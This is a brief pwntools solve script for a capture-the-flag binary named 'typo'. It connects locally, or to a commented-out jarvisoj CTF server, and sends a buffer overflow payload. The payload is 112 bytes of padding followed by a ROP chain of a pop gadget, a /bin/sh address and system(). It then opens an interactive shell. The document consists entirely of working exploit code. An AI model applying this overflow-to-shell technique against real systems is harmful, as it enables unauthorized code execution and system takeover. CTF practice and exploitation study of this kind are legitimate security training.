from pwn import *

p = process('./typo')
#p = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
context.log_level = 'debug'

p.recvuntil('Input ~ if you want to quit\n')
p.send('\n')

sleep(1)

pop_ret = 0x00020904
bin_addr = 0x0006c384
system_addr = 0x110b4
payload = 'A'*112 + p32(pop_ret) + p32(bin_addr) + p32(0x0) + p32(system_addr)*2

p.sendline(payload)

p.interactive()
